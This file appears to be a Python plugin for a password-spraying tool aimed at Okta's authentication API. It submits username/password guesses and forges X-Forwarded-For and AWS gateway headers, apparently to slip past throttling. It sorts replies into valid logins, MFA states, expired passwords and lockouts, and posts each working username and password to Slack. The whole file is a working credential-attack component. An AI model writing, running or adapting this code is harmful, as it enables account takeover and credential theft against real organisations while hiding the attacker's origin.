import json, datetime, requests
import utils.utils as utils


def okta_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
            'timestamp': ts,
            'username': username,
            'password': password,
            'success': False,
            'change': False,
            '2fa_enabled': False,
            'type': None,
            'code': None,
            'name': None,
            'action': None,
            'headers': [],
            'cookies': [],
            'sourceip' : None,
            'throttled' : False,
            'error' : False,
            'output' : ""
    }

    raw_body = "{\"username\":\"%s\",\"password\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true}}" % (username, password)

    spoofed_ip = utils.generate_ip()
    amazon_id = utils.generate_id()
    trace_id = utils.generate_trace_id()

    headers = {
            'User-Agent': useragent,
            "X-My-X-Forwarded-For" : spoofed_ip,
            "x-amzn-apigateway-api-id" : amazon_id,
            "X-My-X-Amzn-Trace-Id" : trace_id,

            'Content-Type': 'application/json'
    }

    headers = utils.add_custom_headers(pluginargs, headers)

    try:
        resp = requests.post("{}/api/v1/authn/".format(url),data=raw_body,headers=headers)

        if resp.status_code == 200:
            resp_json = json.loads(resp.text)

            if resp_json.get("status") == "LOCKED_OUT": #Warning: administrators can configure Okta to not indicate that an account is locked out. Fair warning ;)
                data_response['success'] = False
                data_response['output'] ='FAILED: Locked out {}:{}'.format(username, password)
                data_response['action'] = 'redirect'
                utils.slackupdate("Alert: Accounts are being locked out.")

            elif resp_json.get("status") == "SUCCESS":
                data_response['success'] = True
                data_response['output'] = utils.prGreen('SUCCESS: => {}:{}'.format(username, password))
                utils.slacknotify(username, password + "\nInfo: NO MFA Required!")

            elif resp_json.get("status") == "MFA_REQUIRED":
                data_response['2fa_enabled'] = True
                data_response['success'] = True
                data_response['output'] = utils.prGreen("SUCCESS: 2FA => {}:{}".format(username,password))
                utils.slacknotify(username, password + "\nInfo: MFA Configured.")

            elif resp_json.get("status") == "PASSWORD_EXPIRED":
                data_response['change'] = True
                data_response['success'] = True
                data_response['output'] = utils.prGreen("SUCCESS: password expired {}:{}".format(username,password))
                utils.slacknotify(username, password + "\nInfo: Password Expired.")

            elif resp_json.get("status") == "MFA_ENROLL":
                data_response['success'] = True
                data_response['output'] = "SUCCESS: MFA enrollment required {}:{}".format(username,password)
                utils.slacknotify(username, password + "\nInfo: MFA IS UNCONFIGURED!")

            else:
                data_response['success'] = False
                data_response['output'] = utils.prYellow("ALERT: 200 but doesn't indicate success {}:{}".format(username,password))
                utils.slackupdate("Alert: Somethings weird..")

        elif resp.status_code == 403:
                data_response['success'] = False
                data_response['code'] = resp.status_code
                data_response['output'] = utils.prRed("[!] FAILED THROTTLE INDICATED: {} => {}:{}".format(resp.status_code, username, password))
                utils.slackupdate("Alert: Throttle Detected..")

        else:
            data_response['success'] = False
            data_response['code'] = resp.status_code
            data_response['output'] = "FAILED: {} => {}:{}".format(resp.status_code, username, password)


    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
